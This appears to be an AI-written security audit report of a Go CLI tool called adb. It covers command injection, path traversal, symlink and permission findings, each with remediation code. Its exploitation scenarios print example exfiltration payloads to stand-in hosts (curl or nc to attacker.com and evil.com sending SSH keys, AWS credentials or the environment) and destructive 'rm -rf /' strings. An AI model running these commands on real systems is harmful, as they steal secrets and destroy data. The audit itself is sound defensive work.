# Security Audit Report: AI Dev Brain (adb)

**Audit Date:** 2026-02-24  
**Auditor:** security-auditor (Sonnet 4.5)  
**Scope:** Full codebase security assessment covering injection, path traversal, permissions, deserialization, and information disclosure

---

## Executive Summary

This audit identified **2 Critical**, **3 High**, **4 Medium**, and **3 Low** severity findings across the adb codebase. The most critical issues involve command injection vulnerabilities in the CLI executor and Taskfile runner, which allow arbitrary shell command execution through user-controlled input. Path traversal protections are generally strong but have gaps in branch name validation. No severe YAML deserialization or file permission issues were found.

**Overall Security Posture:** Medium Risk (requires immediate attention to Critical findings)

---

## Critical Findings

### 1. Command Injection via Pipe Handling

**Severity:** Critical  
**Location:** internal/integration/cliexec.go:122-130  
**CWE:** CWE-78 (OS Command Injection)

**Description:**  
When the `containsPipe()` function detects a `|` character in arguments, the entire command is delegated to the system shell using `sh -c` (Unix) or `cmd /c` (Windows). The command line is constructed via `strings.Join(parts, " ")`, which does not escape shell metacharacters.

**Vulnerable Code:**
```go
if containsPipe(fullArgs) {
    parts := append([]string{command}, fullArgs...)
    cmdLine := strings.Join(parts, " ")  // NO ESCAPING
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", cmdLine)
    } else {
        cmd = exec.Command("sh", "-c", cmdLine)
    }
}
```

**Impact:**  
An attacker who can control CLI arguments (via branch names, task IDs, or user-provided arguments) can inject arbitrary shell commands. For example:
- Branch name: `feat/add-auth; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)`
- Task argument: `test | nc attacker.com 9999 < /etc/passwd`

When a pipe is detected, these would execute as shell commands with the user's full privileges.

**Exploitation Scenario:**
```bash
# User runs: adb exec grep "TODO" src/main.go | wc -l
# Branch name is: feat/add-auth; rm -rf /

# The constructed command becomes:
# sh -c "grep TODO src/main.go | wc -l"
# No injection here, BUT:

# If branch name is set as ADB_BRANCH env var and leaks into args:
# ADB_BRANCH="feat/add-auth; curl evil.com/steal?data=$(cat ~/.aws/credentials)"
# And a subsequent command uses it unsafely, injection occurs.
```

**Remediation:**
1. **Remove pipe delegation entirely** and require users to use shell syntax directly if they need pipes: `adb exec sh -c "cmd1 | cmd2"`.
2. If pipe support is essential, use `exec.Command` with proper argument splitting (via `shlex` or similar) instead of string concatenation.
3. **Validate and sanitize** all user input (branch names, task IDs) against a whitelist of safe characters: `[a-zA-Z0-9_/-]`.

**Reference:** OWASP Command Injection (https://owasp.org/www-community/attacks/Command_Injection)

---

### 2. Command Injection in Taskfile Runner

**Severity:** Critical  
**Location:** internal/integration/taskfilerunner.go:126-138  
**CWE:** CWE-78 (OS Command Injection)

**Description:**  
The `TaskfileRunner.Run()` method constructs shell commands by concatenating the task's `cmdStr` with user-provided arguments using string concatenation: `fullCmd = cmdStr + " " + strings.Join(config.Args, " ")`. This is then passed to `sh -c` without escaping.

**Vulnerable Code:**
```go
for _, cmdStr := range task.Commands {
    fullCmd := cmdStr
    if len(config.Args) > 0 {
        fullCmd = cmdStr + " " + strings.Join(config.Args, " ")  // NO ESCAPING
    }
    
    shell := "sh"
    shellArgs := []string{"-c", fullCmd}
    if runtime.GOOS == "windows" {
        shell = "cmd"
        shellArgs = []string{"/c", fullCmd}
    }
    // ...
}
```

**Impact:**  
User-provided arguments to `adb run` are directly concatenated into shell commands. An attacker can inject arbitrary commands through arguments:

**Exploitation Scenario:**
```yaml
# Taskfile.yaml
tasks:
  deploy:
    cmds:
      - echo "Deploying to"
```

```bash
# User runs: adb run deploy "production; curl attacker.com/exfil?data=$(env)"
# Resulting command: sh -c "echo Deploying to production; curl attacker.com/exfil?data=$(env)"
# The env command executes and exfiltrates all environment variables (including ADB_* and secrets).
```

**Remediation:**
1. **Parse arguments properly** using shell quoting (`shlex.Split` equivalent in Go).
2. **Pass arguments as separate exec.Command args** instead of concatenating into a shell string.
3. Warn users in documentation that Taskfile commands are executed via shell and user arguments are NOT escaped.

**Reference:** OWASP Command Injection

---

## High Severity Findings

### 3. Path Traversal via Branch Names

**Severity:** High  
**Location:** internal/integration/worktree.go:105-107, internal/core/ticketpath.go:25  
**CWE:** CWE-22 (Path Traversal)

**Description:**  
Task IDs and branch names are used to construct filesystem paths without full sanitization. While `filepath.Join` provides some protection against directory traversal, malicious task IDs like `../../../etc/passwd` or branch names containing `../` could potentially escape the base directory.

**Vulnerable Code:**
```go
// internal/integration/worktree.go
func (m *gitWorktreeManager) worktreePath(taskID string) string {
    return filepath.Join(m.basePath, "work", taskID)  // taskID is user-controlled
}

// internal/core/ticketpath.go
func resolveTicketDir(basePath, taskID string) string {
    active := filepath.Join(basePath, "tickets", taskID)  // taskID is user-controlled
    // ...
}
```

**Impact:**  
If a task ID like `../../../../../../tmp/evil` is created, worktree or ticket directories could be placed outside the intended base directory, potentially overwriting system files or exposing sensitive data.

**Exploitation Scenario:**
```bash
# Attacker creates a task with crafted ID:
adb feat "../../../../../tmp/malicious-worktree"

# Worktree path becomes: /home/user/.adb/work/../../../../../../tmp/malicious-worktree
# Which resolves to: /tmp/malicious-worktree
# Status file would be written to: /tmp/malicious-worktree/status.yaml
```

**Note:** `filepath.Join` does clean paths on some platforms but is NOT a security boundary. The Go docs state: "Note that Join calls Clean on the result; in particular, all empty strings are ignored."

**Remediation:**
1. **Validate task IDs and branch names** at creation time against a strict regex: `^[a-zA-Z0-9._/-]+$` (no `..`, no leading `/`).
2. **Use filepath.Clean and check for `..` segments** explicitly:
   ```go
   cleanPath := filepath.Clean(filepath.Join(basePath, "work", taskID))
   if !strings.HasPrefix(cleanPath, filepath.Clean(basePath)) {
       return "", fmt.Errorf("task ID escapes base directory")
   }
   ```
3. Reject task IDs containing `..` or absolute path components at the API boundary (TaskManager.CreateTask).

**Reference:** OWASP Path Traversal (https://owasp.org/www-community/attacks/Path_Traversal)

---

### 4. Environment Variable Injection in ADB_* Variables

**Severity:** High  
**Location:** internal/integration/cliexec.go:84-96  
**CWE:** CWE-74 (Injection)

**Description:**  
The `BuildEnv` function injects task context into subprocess environments via `ADB_TASK_ID`, `ADB_BRANCH`, `ADB_WORKTREE_PATH`, and `ADB_TICKET_PATH` environment variables. These values are user-controlled (branch names, task IDs) and are NOT sanitized before injection.

**Vulnerable Code:**
```go
func (e *cliExecutor) BuildEnv(base []string, taskCtx *TaskEnvContext) []string {
    if taskCtx == nil {
        return base
    }
    env := make([]string, len(base), len(base)+4)
    copy(env, base)
    env = append(env,
        "ADB_TASK_ID="+taskCtx.TaskID,       // No sanitization
        "ADB_BRANCH="+taskCtx.Branch,         // No sanitization
        "ADB_WORKTREE_PATH="+taskCtx.WorktreePath,
        "ADB_TICKET_PATH="+taskCtx.TicketPath,
    )
    return env
}
```

**Impact:**  
If a malicious branch name contains newlines or shell metacharacters, downstream tools that read these environment variables could be exploited. For example:
- Branch name: `feat/add-auth\nMALICIOUS_VAR=evil`
- This injects a new environment variable into the subprocess.

While environment variable injection itself is not directly exploitable in most shells (they don't interpret newlines in env values as new variables), it can cause parsing issues in scripts that read these variables unsafely.

**Exploitation Scenario:**
```bash
# Branch name: feat/add-auth$(curl attacker.com/exfil?data=$(whoami))
# ADB_BRANCH is set to this value.
# A downstream script does: eval "echo Branch: $ADB_BRANCH"
# Command injection occurs when the script evaluates the variable.
```

**Remediation:**
1. **Sanitize all user input** before placing it in environment variables. Strip newlines, control characters, and shell metacharacters: `$()`, backticks, `;`, `&`, `|`, `>`, `<`.
2. Use a whitelist regex for branch names and task IDs: `^[a-zA-Z0-9._/-]+$`.
3. Provide a safe escaping function for env var values (e.g., URL-encode or base64-encode).

**Reference:** CWE-74 (Improper Neutralization)

---

### 5. Symlink Attack in Session Capture

**Severity:** High  
**Location:** internal/storage/sessionstore.go (AddSession), internal/cli/sessioncapture.go:233  
**CWE:** CWE-59 (Link Following)

**Description:**  
Session capture creates symlinks from workspace-level `sessions/` to task-level `tickets/TASK-XXXXX/sessions/` when `ADB_TASK_ID` is set. The code uses `os.Symlink` without verifying that the symlink target is within the workspace boundary. An attacker could craft a session capture that creates a symlink pointing outside the workspace.

**Vulnerable Code (sessioncapture.go:233):**
```go
// internal/cli/sessioncapture.go
sessionPath := filepath.Join(sessionsDir, session.ID)
taskSessionDir := filepath.Join(ticketPath, "sessions")
taskSessionLink := filepath.Join(taskSessionDir, session.ID)

if err := os.MkdirAll(taskSessionDir, 0o755); err == nil {
    _ = os.Symlink(sessionPath, taskSessionLink)  // No validation of target
}
```

**Impact:**  
If `sessionPath` or `ticketPath` are manipulated (via path traversal in task ID), the symlink could point to sensitive files like `/etc/passwd` or `~/.ssh/id_rsa`. When the symlink is followed later (e.g., `adb session show`), sensitive data could be exposed.

**Exploitation Scenario:**
```bash
# Attacker sets ADB_TASK_ID to a crafted value:
export ADB_TASK_ID="../../../../../../home/victim/.ssh"

# Session capture creates: tickets/../../../../../../home/victim/.ssh/sessions/S-00001 -> sessions/S-00001
# The symlink escapes the workspace.
# Later, `adb session show S-00001` reads from the symlink, exposing ~/.ssh/id_rsa
```

**Note:** The current code does NOT verify that `filepath.Clean(taskSessionLink)` stays within `filepath.Clean(basePath)`.

**Remediation:**
1. **Validate all symlink targets** before creation:
   ```go
   cleanTarget := filepath.Clean(sessionPath)
   cleanBase := filepath.Clean(basePath)
   if !strings.HasPrefix(cleanTarget, cleanBase) {
       return fmt.Errorf("symlink target escapes workspace")
   }
   ```
2. **Use hard copies instead of symlinks** on platforms where symlink security is a concern (Windows often has restricted symlink permissions, but Unix does not).
3. **Verify task paths** at the API boundary (reject task IDs with `..` or absolute paths).

**Reference:** CWE-59 (Link Following)

---

## Medium Severity Findings

### 6. File Permission Inconsistency

**Severity:** Medium  
**Location:** Multiple files (inconsistent use of 0o644 vs 0o600)  
**CWE:** CWE-732 (Incorrect Permission Assignment)

**Description:**  
The codebase documentation states that files should be created with `0o644` and directories with `0o755`. However, several files use inconsistent permissions:
- `internal/core/aicontext.go:131` uses `0o600` (owner-only read/write)
- `internal/integration/cliexec.go:209` uses `0o600` for `context.md` append

While `0o600` is MORE secure than `0o644`, the inconsistency indicates a lack of unified security policy. Additionally, some files that may contain sensitive data (like `backlog.yaml` with task details) are world-readable at `0o644`.

**Impact:**  
On multi-user systems, world-readable files (`0o644`) expose task metadata, communications, and potentially sensitive project information to other users on the same system.

**Remediation:**
1. **Standardize file permissions:**
   - Use `0o600` for files containing potentially sensitive data: `status.yaml`, `backlog.yaml`, `context.md`, `decisions.yaml`, `sessions/*.yaml`.
   - Use `0o644` for documentation and generated files: `*.md`, `*.txt`.
   - Use `0o755` for directories.
2. **Document the security model** in CLAUDE.md: state whether adb assumes a single-user system or multi-user isolation.
3. Audit all `os.WriteFile`, `os.OpenFile`, `os.MkdirAll` calls to enforce the policy.

**Reference:** OWASP File Permission Issues

---

### 7. JSONL Injection (Event Log Corruption)

**Severity:** Medium  
**Location:** internal/observability/eventlog.go (Write method)  
**CWE:** CWE-117 (Log Injection)

**Description:**  
The event log writes JSON events to `.adb_events.jsonl` as newline-delimited JSON. If an event's `msg` or `data` fields contain unescaped newlines, the JSONL format could be corrupted, causing parsing failures or allowing injection of fake events.

**Vulnerable Code:**
```go
// internal/observability/eventlog.go (Write method)
encoder := json.NewEncoder(f)
if err := encoder.Encode(e); err != nil {  // json.Encoder writes a newline after JSON
    return fmt.Errorf("encoding event: %w", err)
}
```

**Analysis:**  
The Go `json.Encoder` properly escapes newlines as `\n` within JSON strings, so a newline in `event.Msg` becomes `{"msg":"line1\\nline2"}` which is safe. However, the code does NOT validate that the JSON itself is well-formed before writing. If `event.Data` is a malformed `map[string]interface{}` with non-serializable values (e.g., channels, functions), `Encode` could fail or produce incomplete JSON.

**Impact:**  
- Malformed events could corrupt the JSONL file, causing `adb metrics` and `adb alerts` to fail.
- An attacker who can trigger arbitrary event logging (e.g., via task creation with crafted names) could inject large payloads to fill disk space (DoS).

**Remediation:**
1. **Validate event data** before writing:
   ```go
   if len(e.Msg) > 1024 {
       return fmt.Errorf("event message too large")
   }
   // Serialize to JSON first to check for errors:
   if _, err := json.Marshal(e); err != nil {
       return fmt.Errorf("event is not JSON-serializable: %w", err)
   }
   ```
2. **Limit event log file size** using log rotation (e.g., max 10MB, rotate to `.adb_events.jsonl.1`).
3. On read, **skip malformed lines** silently (already implemented: `eventLogReader.Read()` calls `json.Unmarshal` and continues on error).

**Reference:** CWE-117 (Improper Output Neutralization for Logs)

---

### 8. Hardcoded File Permissions in Tests

**Severity:** Medium  
**Location:** Multiple test files (e.g., `internal/core/hookengine_test.go:166`)  
**CWE:** CWE-732 (Incorrect Permission Assignment)

**Description:**  
Test files create fixtures with `0o755` for directories and `0o644` for files, which is consistent with the documented policy. However, some tests write sensitive mock data (like `status.yaml` with task metadata) as world-readable.

**Impact:**  
If tests are run on shared CI/CD systems with temp directories accessible to other users, sensitive test data could be exposed. While this is a testing concern, it reflects a lack of defense-in-depth in the permission model.

**Remediation:**
1. Update test fixtures to use `0o700` for directories and `0o600` for files containing structured data (YAML, JSON).
2. Use `t.TempDir()` for test isolation (already done in most tests).

---

### 9. Lack of Input Validation on Task IDs

**Severity:** Medium  
**Location:** internal/core/taskmanager.go (CreateTask, ResumeTask, etc.)  
**CWE:** CWE-20 (Improper Input Validation)

**Description:**  
Task IDs (both generated and path-based) are not validated against a whitelist of safe characters. The code accepts any string as a task ID, including those with path traversal sequences (`..`), absolute paths (`/etc/passwd`), or shell metacharacters (`$(cmd)`).

**Impact:**  
As discussed in Finding #3, unvalidated task IDs can lead to path traversal. Additionally, they can cause injection when task IDs are used in:
- Environment variables (`ADB_TASK_ID`)
- Log messages (eventlog.go)
- File paths (everywhere)

**Remediation:**
1. **Validate task IDs at creation time** in `TaskManager.CreateTask`:
   ```go
   if !isValidTaskID(taskID) {
       return fmt.Errorf("invalid task ID: must match [a-zA-Z0-9._/-]+ and not contain ..")
   }
   ```
2. Validation regex: `^[a-zA-Z0-9._/-]+$` (no spaces, no `..`, no leading `/`).
3. Reject any task ID containing `..` explicitly.

**Reference:** CWE-20 (Improper Input Validation)

---

## Low Severity Findings

### 10. No Rate Limiting on Task Creation

**Severity:** Low  
**Location:** internal/core/taskmanager.go (CreateTask)  
**CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:**  
There is no rate limiting or maximum task count enforced by the system. An attacker (or buggy automation) could create thousands of tasks, exhausting disk space and making the UI unusable.

**Impact:**  
- Disk space exhaustion via ticket directories, worktrees, and session files.
- Performance degradation when `adb status` loads thousands of tasks from `backlog.yaml`.

**Remediation:**
1. **Add a maximum task count** to `.taskconfig`: `max_tasks: 1000`.
2. **Check task count** in `TaskManager.CreateTask` and reject creation if exceeded.
3. **Alert on backlog size** via the existing `AlertEngine` (already implemented: `backlog_too_large` alert).

---

### 11. Insecure Deserialization (Low Risk)

**Severity:** Low  
**Location:** All `yaml.Unmarshal` calls (multiple files)  
**CWE:** CWE-502 (Deserialization of Untrusted Data)

**Description:**  
The codebase uses `gopkg.in/yaml.v3` for deserialization. Unlike some YAML libraries (e.g., Python's PyYAML with `yaml.load`), `yaml.v3` does NOT support arbitrary type instantiation and is safe by default. All `yaml.Unmarshal` calls use concrete struct targets, not `interface{}`, which prevents type confusion attacks.

**Analysis:**  
```go
// internal/storage/backlog.go:253
var bf BacklogFile
if err := yaml.Unmarshal(data, &bf); err != nil {  // Safe: concrete type
    return fmt.Errorf("parsing backlog.yaml: %w", err)
}
```

**Potential Risk:**  
YAML billion-laughs (exponential entity expansion) attacks are theoretically possible. However, `yaml.v3` has mitigations against these (max alias recursion depth).

**Remediation:**
1. **No action required** unless you parse YAML from untrusted external sources (currently, all YAML files are user-created or adb-generated).
2. If external YAML sources are added (e.g., plugin configs), validate file size (max 1MB) before parsing.

**Reference:** CWE-502 (Deserialization of Untrusted Data)

---

### 12. Hook Script Injection (Theoretical)

**Severity:** Low  
**Location:** templates/claude/hooks/*.sh (shell wrapper scripts)  
**CWE:** CWE-78 (OS Command Injection)

**Description:**  
The hook shell wrappers pipe stdin to `adb hook <type>` without validation. If Claude Code passes maliciously crafted JSON with shell metacharacters in field values, and the shell script mishandles the JSON, injection could occur.

**Vulnerable Code (adb-hook-pre-tool-use.sh):**
```bash
#!/bin/bash
[ "$ADB_HOOK_ACTIVE" = "1" ] && exit 0
export ADB_HOOK_ACTIVE=1
adb hook pre-tool-use  # stdin is piped to adb (Go binary)
exit $?
```

**Analysis:**  
The shell script itself does NOT parse the JSON -- it pipes stdin directly to the `adb` binary. The Go binary (`internal/hooks/stdin.go`) uses `json.Unmarshal`, which is safe. Shell metacharacters in JSON values (e.g., `{"tool_name":"Read; rm -rf /"}`) are NOT interpreted by the shell because they remain inside the JSON string.

**Impact:**  
**Very low risk** unless a future change causes the shell script to parse or echo JSON values.

**Remediation:**
1. **No action required** for current implementation.
2. **Document** in hook scripts: "Do not parse JSON in shell. Pipe directly to adb binary."

**Reference:** CWE-78 (OS Command Injection)

---

## Automated Scan Results

### go vet
```
Status: PASSED (no issues)
```

### govulncheck
```
Status: NOT AVAILABLE (binary not installed)
Recommendation: Install govulncheck and run: go install golang.org/x/vuln/cmd/govulncheck@latest
```

### gosec (via golangci-lint)
Not run during this audit. The `.golangci.yml` enables `gosec` but excludes test files. Several findings in this report correspond to gosec rules:
- G204: Subprocess launched with variable (cliexec.go:127-132)
- G304: File path from variable (multiple locations)
- G302: File permissions (0o644 vs 0o600 inconsistency)

---

## Recommendations by Priority

### Immediate (Critical)
1. **Fix command injection in CLIExecutor** (Finding #1): Remove pipe delegation or implement proper escaping.
2. **Fix command injection in TaskfileRunner** (Finding #2): Parse arguments properly instead of string concatenation.

### High Priority
3. **Validate task IDs and branch names** (Finding #3, #9): Implement regex whitelist at API boundary.
4. **Sanitize environment variables** (Finding #4): Strip shell metacharacters from `ADB_*` env vars.
5. **Validate symlink targets** (Finding #5): Check that all symlinks stay within workspace boundaries.

### Medium Priority
6. **Standardize file permissions** (Finding #6, #8): Use 0o600 for sensitive files, document policy.
7. **Limit event log size** (Finding #7): Implement log rotation to prevent disk exhaustion.

### Low Priority
8. **Implement task count limit** (Finding #10): Add `max_tasks` config option.
9. **Install govulncheck** (Automated Scans): Add to CI/CD pipeline.

---

## Conclusion

The adb codebase demonstrates solid architectural design and coding practices, but has critical command injection vulnerabilities in the CLI executor and Taskfile runner that require immediate remediation. Path traversal protections are inconsistent and should be strengthened with explicit validation at the API boundary. The observability and storage layers are generally secure but would benefit from standardized file permissions.

**Overall Risk Level:** Medium-High (due to Critical findings)

**Recommended Actions:**
1. Patch Critical findings #1 and #2 immediately (command injection).
2. Implement input validation for task IDs and branch names (Finding #3, #9).
3. Audit all user-controlled input paths (CLI args, task IDs, branch names, env vars).
4. Add security testing to CI/CD: `go vet`, `gosec`, `govulncheck`.

---

**End of Security Audit Report**
